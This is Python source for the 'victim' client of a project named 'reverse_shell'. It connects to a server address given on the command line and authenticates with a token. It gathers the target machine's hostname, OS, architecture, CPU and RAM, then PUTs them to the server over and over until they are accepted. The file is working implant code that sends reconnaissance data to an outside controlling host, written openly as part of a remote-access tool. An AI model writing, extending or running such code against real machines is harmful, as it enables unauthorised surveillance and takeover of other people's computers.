import subprocess
import platform
import os
import re
import psutil
import json
import sys
import argparse
from reverse_shell import __app_name__, __version__
from reverse_shell.victim import ErrorCodes
import reverse_shell.utils as ut
from pathlib import Path
from time import sleep
from http.client import HTTPConnection
from http import HTTPStatus


class Victim:
    def __init__(self, auth_token: str, server_address: str, port_number: int = 80):
        # Establish a connection with the server
        self.connection = HTTPConnection(server_address, port_number)
        self.id = ut.get_id(Path("ole32.dll"))
        self.client_type = "victim"
        encoded_auth_token = ut.encode_token(auth_token)
        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {encoded_auth_token}"}

    @staticmethod
    def get_processor_name():
        if platform.system() == "Windows":
            return platform.processor()
        elif platform.system() == "Darwin":
            os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
            command = ["sysctl", "-n", "machdep.cpu.brand_string"]
            return subprocess.check_output(command).strip().decode("utf-8")
        elif platform.system() == "Linux":
            command = "cat /proc/cpuinfo"
            all_info = subprocess.check_output(command, shell=True).decode().strip()
            for line in all_info.split("\n"):
                if "model name" in line:
                    return re.sub(".*model name.*:", "", line, 1)
        return ""

    def send_computer_info(self):
        """Send victims computer information to the server."""
        # Obtain necessary computer information
        computer_information = {
            "host_name": platform.uname().node,
            "os": platform.platform(),
            "arch": platform.machine(),
            "cpu": self.get_processor_name(),
            "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))}GB"
        }
        # Create a POST request infinitely until the server sends back
        # the 201 status code
        status_code = None
        while status_code != HTTPStatus.CREATED and status_code != HTTPStatus.OK and status_code != HTTPStatus.UNAUTHORIZED:
            # We first need to reformat the data to include the victim_id
            # encoded_computer_specs = json.dumps(computer_information)
            data = json.dumps(computer_information)
            self.connection.request("PUT", "/victim_computer_specs", body=data, headers={**self.default_header, "Content-type": "application/json", "Content-Length": str(len(data.encode("utf-8")))})

            response = self.connection.getresponse()
            status_code = response.status
            print(f"{response.status} {response.reason}")
            sleep(2)

        if status_code == HTTPStatus.UNAUTHORIZED:
            ut.log("error", "Invalid authentication token")
            sys.exit(ErrorCodes.unauthorized)

        ut.log("success", "Computer info has been sent to the server!")


def get_config():
    parser = argparse.ArgumentParser(prog=f"{__app_name__} victim", description=f"The victim for the {__app_name__} project",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter
                                     )

    parser.add_argument("-i", "--ip", type=str, required=True, help="The ip of the victim server")

    parser.add_argument("-p", "--port", type=int, required=False, help="The port the server is running on", default=80)

    parser.add_argument("-t", "--token", type=str, required=True, help=f"Authentication token generated by a {__app_name__} server.")

    parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} victim v{__version__}")

    return parser.parse_args()


def initiate_victim(token: str, server_ip: str, server_port: int = 80):
    victim = Victim(token, server_ip, server_port)
    victim.send_computer_info()


def main():
    config = get_config()
    initiate_victim(config.token, config.ip, config.port)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
